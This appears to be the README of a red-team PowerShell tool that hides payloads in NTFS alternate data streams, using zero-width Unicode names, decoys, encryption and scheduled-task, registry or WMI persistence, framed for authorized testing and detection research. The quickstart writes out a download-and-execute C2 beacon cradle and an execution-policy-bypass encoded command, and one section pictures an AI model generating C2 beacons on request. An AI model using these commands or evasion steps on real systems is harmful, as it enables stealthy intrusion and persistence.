#### README.md
# Apparition Delivery System
```
. : .  .  .. ... ...... ..................... ...... ... .. .  . : .
: .   .       .       .        .        .        .        .   . . :
.       _    ___   ___   _     ___    ___ _____  _   ___  _  _       .
       /_\   | _ \| _ \ /_\   | __ \ |_ _|_   _|| | / _ \| \| |
      / _ \  |  _/|  _// _ \  | |/ /  | |  | |  | || (_) | .` |
     /_/ \_\ |_|  |_/ /_/ \_\ |_|\_| |___| |_|  |_| \___/|_|\_|
: .    . .   . . ..  . .. . . .. . .. .. . .. ... . .. .    . . :
.   .  .     . :     .    :  . : :   . : :    . :      .    .   .
   .   :      '  Apparition Delivery System (ADS) '      :    .
 .  .  .   . . ' " Execution without presence " ' .    .   .  .
    . .      . .. .. . ... .................. .. . .. .      . .
```

If on linux, use the following to see some ASCII art:
```
echo -e "\033[34m. : .  .  .. \033[36m... ...... ..................... ...... ... ..\033[34m .  . : .\n: .   .       .       \033[36m.        .        .        .\033[34m       .   . . :\n.       \033[36m_    ___   \033[96m___   _      ___    ___ _____  _    \033[36m___  _  _       \033[34m.\n       \033[36m/_\   | _ \| \033[97m_ \ /_\    | __ \ |_ _|_   _|| | \033[36m/ _ \| \| |\n      \033[36m/ _ \  |  _/| \033[97m _// _ \   | |/ /  | |  | |  | || \033[36m(_) | .\` |\n     \033[36m/_/ \_\ |_|  \033[97m|_/ /_/ \_\  |_|\_| |___| |_|  |_| \033[36m\___/|_|\_|\n\033[34m: .    . .   \033[36m. . ..  . .. . . .. . .. .. . .. ... . .. .\033[34m    . . :\n.   .  .     \033[36m. :     .    :  . : :   . : :    . :      .\033[34m    .   .\n   .   :      \033[36m'  \033[96mApparition Delivery System (ADS)\033[36m '      \033[34m:    .\n .  .  .   . . \033[36m' \033[96m\" Execution without presence \"\033[36m '\033[34m .    .   .  .\n    . .      . .. .. . ... .................. .. . .. .      . .\033[0m"
```

---

## Note: This tool passed some manual execution checks in controlled VMs; it has not been tested for automation, in the wild, or for long-term reliability. I welcome fixes/improvements. Thank you for looking!

---

## Purpose
ADS (Apparition Delivery System) is a research framework for exploring stealthy 
Windows execution techniques that exist, execute, and persist outside traditional visibility.

**Primary Use Cases:**
1. Red Team: CCDC-style persistence testing (authorized environments only)
2. Blue Team: Understanding ADS detection gaps and telemetry
3. Research: Novel NTFS hiding techniques and their forensic visibility

---

## Ethical Guidelines
✅ Authorized penetration testing with explicit permission
✅ CCDC competition (adversary emulation)
✅ Security research and detection development
❌ Unauthorized access to systems
❌ Malicious use

---

## Architecture
```
[Payload] → [Storage] → [Loader] → [Trigger]
```

**Storage Backends:**
| Type           | Visibility | Stability        | Use Case                     |
|----------------|------------|------------------|------------------------------|
| Classic ADS    | Medium     | High             | Production red team          |
| Volume Root    | Low        | High             | Enumeration evasion research |
| NTFS Internal* | Very Low   | **Experimental** | Research only                |

### *NTFS Internal streams (e.g., $LOGGED_UTILITY_STREAM) are **unstable** and may cause filesystem corruption. Use only in disposable VMs.

---

## 🚀 Quickstart

### **v2.0 Workflow: Generate on Linux, Deploy on Windows**

The recommended workflow uses **ADS-OneLiner.ps1** to generate minimal payloads on your attacker machine:

#### **On Linux (Kali):**
```bash
# Generate encrypted payload with stealth features
pwsh ./src/ADS-OneLiner.ps1 \
  -Payload "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')" \
  -Encrypt \
  -Randomize \
  -ZeroWidthStreams \
  -CreateDecoys 3 \
  -OutputFile payload.txt

# Manifest saved to ./manifests/ for recovery
```

#### **On Windows Target:**
```powershell
# Copy OPTION 1 from payload.txt and paste:
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64_here>

# Done! No file uploads needed.
```

### **Alternative: Direct Deployment (v1.0 method)**

For local testing or when you have filesystem access:
```powershell
# Upload ADS-Dropper.ps1 to target, then run:
.\ADS-Dropper.ps1 -Payload $payload -Persist task -Encrypt -Randomize
```

---

## 🎯 Key Features

### **Two-Script Architecture**
- **ADS-Dropper.ps1**: Core engine (runs on Linux OR Windows)
- **ADS-OneLiner.ps1**: Command generator (Linux only, generates Windows payloads)

### **Deployment Methods**
1. **Generate-and-Paste** (v2.0) - No file uploads, minimal footprint
2. **Upload-and-Execute** (v1.0) - Traditional method, still supported

### **LLM Integration**
Could easily be added to tool calls and manifest output routed to payload tracking:
```
User: "Generate an encrypted C2 beacon for 10.0.0.50"
Claude: [runs ADS-OneLiner.ps1, returns base64 one-liner]
Manifest: Routed to LLM for payload recovery/tracking
User: [pastes on Windows target]
```

### `-ZeroWidthStreams`

Enable zero-width Unicode characters in stream names for enhanced stealth.

Example:
```powershell
-ZeroWidthStreams
```

**How it works:**
- Uses invisible Unicode characters (U+200B, U+200C, U+FEFF, etc.)
- Stream names appear blank or truncated in most tools
- Bypasses simple string-based detection

---

### `-ZeroWidthMode`

Specifies how zero-width characters are used.  
Options: `single`, `multi`, `hybrid`  
Default: `single`

**Modes:**

1. **single** - One zero-width character
```powershell
   -ZeroWidthStreams -ZeroWidthMode single
   # Stream: [invisible character]
```

2. **multi** - Multiple zero-width characters
```powershell
   -ZeroWidthStreams -ZeroWidthMode multi
   # Stream: [3-5 invisible characters]
```

3. **hybrid** - Legitimate prefix + zero-width suffix
```powershell
   -ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix "Zone.Identifier"
   # Stream: Zone.Identifier[invisible character]
```

---

### `-HybridPrefix`

Legitimate stream name to use as prefix in hybrid mode.

Common prefixes:
- `Zone.Identifier` (most common, created by browser downloads)
- `Summary` (document metadata)
- `Comments` (user annotations)

Example:
```powershell
-ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix "Zone.Identifier"
```

---

### `-CreateDecoys`

Number of benign decoy streams to create (0-10).

Creates legitimate-looking streams to obscure the real payload:
- `Zone.Identifier` - Download zone information
- `Summary` - Document summary
- `Comments` - File comments
- `Author` - Author metadata

Example:
```powershell
-CreateDecoys 3
```

**OPSEC Note:** Decoys add noise but increase forensic complexity.

### Multi-Target Deployment
```powershell
# Deploy to multiple targets (experimental)
.\src\ADS-Dropper.ps1 -Payload $payload -Targets @('dc01','web01','app01') -Encrypt -ZeroWidthStreams
```
### Cleanup Operations
```powershell
# List all ADS with byte-level details
.\src\ADS-Dropper.ps1 -CleanupMode list

# Safe removal with confirmation
.\defense\Cleanup-ZeroWidthADS.ps1 -File "C:\ProgramData\system.dll" -StreamBytes "0x0B 0x20" -WhatIf
```

---

## 📚 Full Command Reference
### ADS-Dropper.ps1
.\src\ADS-Dropper.ps1 `
    -Payload <string|scriptblock|filepath> `
    [-Targets <string[]>] `
    [-Persist <task|registry|wmi>] `
    [-Randomize] `
    [-Encrypt] `
    [-ZeroWidthStreams] `
    [-ZeroWidthMode <single|multi|hybrid>] `
    [-HybridPrefix <string>] `
    [-CreateDecoys <int>] `
    [-ManifestStorage <file|registry|both|none>] `
    [-NoExec] `
    [-CleanupMode <none|list|remove>] `
    [-Credential <PSCredential>]

#### Parameters:
#### Parameter
#### Type
#### Description
#### Default
Payload
string/scriptblock
Payload to deploy
Required
Targets
string[]
Target hostnames
localhost
Persist
string[]
Persistence methods
task
Randomize
switch
Randomize file/stream names
False
Encrypt
switch
AES-256 encrypt payload
False
ZeroWidthStreams
switch
Use zero-width Unicode
False
ZeroWidthMode
string
single, multi, or hybrid
single
HybridPrefix
string
Prefix for hybrid mode
Auto-selected
CreateDecoys
int
Number of decoy streams (0-10)
0
ManifestStorage
string
Manifest backend
file
NoExec
switch
Deploy without executing
False
CleanupMode
string
Cleanup operation
none


---

## Detection Tools Provided
Located in /defense directory

---

## 📖 References & Credits
### Core Research
- Oddvar Moe - ADS Execution (https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
- Enigma0x3 - ADS Persistence (https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/)
- MITRE ATT&CK T1564.004 (https://attack.mitre.org/techniques/T1564/004/)
### Unicode & NTFS
- Unicode Zero-Width Characters (https://www.unicode.org/charts/)
- Microsoft NTFS Documentation (https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams)
### Tools
- Sysinternals Streams
- Sysmon

---

## ⚖️ License & Disclaimer
### Educational and Defensive Use Only
### This tool is provided for:
- Authorized security testing
- Educational purposes
- Detection research
- Blue team training
Unauthorized use is illegal and unethical. The author assumes no liability for misuse.
### By using this tool, you agree to:
- Only use in authorized environments
- Obtain explicit written permission before testing
- Follow responsible disclosure practices
- Provide detection guidance to defenders

---

## 📞 Contact & Support
- Author: Qweary
- Email: qwearyblog@gmail.com
- LinkedIn: https://www.linkedin.com/in/louis-piano-099826b2
- Blog: https://qweary.github.io
Found a bug? Open an issue on GitHub Have questions? Email or LinkedIn message Want to contribute? Pull requests welcome!

---

"Execution without presence" 👻
© 2026 Qweary — Security Research With Purpose
